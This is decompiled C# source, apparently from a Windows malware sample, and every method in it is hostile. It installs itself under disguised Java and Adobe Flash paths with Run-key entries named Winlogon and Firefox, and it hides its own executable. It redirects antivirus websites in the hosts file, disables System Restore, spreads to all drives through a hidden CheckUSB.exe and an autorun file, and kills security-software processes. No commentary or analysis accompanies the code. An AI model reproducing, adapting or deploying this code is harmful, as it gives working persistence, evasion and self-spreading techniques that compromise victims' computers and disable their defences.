using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ns0;

internal class Class7
{
	[DebuggerNonUserCode]
	public Class7()
	{
	}

	public static void smethod_0()
	{
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Sun\\Java\\AU\\JUpdate.exe";
			if (File.Exists(text))
			{
				((ServerComputer)Class1.Class0_0).get_FileSystem().DeleteFile(text);
			}
			File.Copy(Application.get_ExecutablePath(), text);
			((ServerComputer)Class1.Class0_0).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("1" + Application.get_ProductName(), text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1()
	{
		try
		{
			string fileName = Path.GetFileName(Application.get_ExecutablePath());
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Sun\\Java\\AU\\";
			((ServerComputer)Class1.Class0_0).get_FileSystem().CopyFile(Application.get_ExecutablePath(), text + fileName, true);
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(fileName, text);
			registryKey.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_2()
	{
		try
		{
			string fileName = Path.GetFileName(Application.get_ExecutablePath());
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			if (File.Exists(folderPath + "\\Adobe\\Flash Player\\AssetCache" + fileName))
			{
				((ServerComputer)Class1.Class0_0).get_FileSystem().DeleteFile(folderPath + "\\Adobe\\Flash Player\\AssetCache" + fileName);
			}
			File.Copy(Application.get_ExecutablePath(), folderPath + "\\Adobe\\Flash Player\\AssetCache" + fileName);
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Winlogon", (object)(folderPath + "\\Adobe\\Flash Player\\AssetCache" + fileName), RegistryValueKind.String);
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Firefox", (object)Assembly.GetEntryAssembly()!.Location, RegistryValueKind.String);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_3()
	{
		try
		{
			File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_4()
	{
		try
		{
			string path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
			StreamWriter streamWriter = new StreamWriter(path, append: true);
			string value = "\n 127.0.0.1 www.virustotal.com";
			string text = "\n 127.0.0.1 www.bitdefender.com";
			string text2 = "\n 127.0.0.1 www.virusscan.jotti.org";
			string text3 = "\n 127.0.0.1 www.scanner.novirusthanks.org";
			streamWriter.Write(value);
			streamWriter.Write("\r\n" + text);
			streamWriter.Write("\r\n" + text2);
			streamWriter.Write("\r\n" + text3);
			streamWriter.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_5()
	{
		try
		{
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_6()
	{
		try
		{
			string text = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue(text, "Hidden", (object)"0", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_7()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		checked
		{
			try
			{
				ListBox val = new ListBox();
				for (int i = 0; i != ((ServerComputer)Class1.Class0_0).get_FileSystem().get_Drives().Count - 1; i++)
				{
					val.get_Items().Add((object)((ServerComputer)Class1.Class0_0).get_FileSystem().get_Drives()[i].ToString());
				}
				for (int i = 0; i != val.get_Items().get_Count(); i++)
				{
					try
					{
						try
						{
							((ServerComputer)Class1.Class0_0).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"CheckUSB.exe")));
							((ServerComputer)Class1.Class0_0).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"boot.inf")));
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						((ServerComputer)Class1.Class0_0).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"CheckUSB.exe")));
						FileSystem.FileOpen(1, Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"boot.inf")), (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
						FileSystem.FilePut(1, "[autorun]\r\nshellexecute=CheckUSB.exe", -1L, false);
						FileSystem.FileClose(new int[1] { 1 });
						try
						{
							((ServerComputer)Class1.Class0_0).get_FileSystem().GetFileInfo(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"CheckUSB.exe"))).Attributes = FileAttributes.Hidden | FileAttributes.System;
							((ServerComputer)Class1.Class0_0).get_FileSystem().GetFileInfo(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"boot.inf"))).Attributes = FileAttributes.Hidden | FileAttributes.System;
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void smethod_8()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "outpost", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_9()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "npfmsg", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_10()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "bdagent", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_11()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "egui", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_12()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "zlclient", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}
}
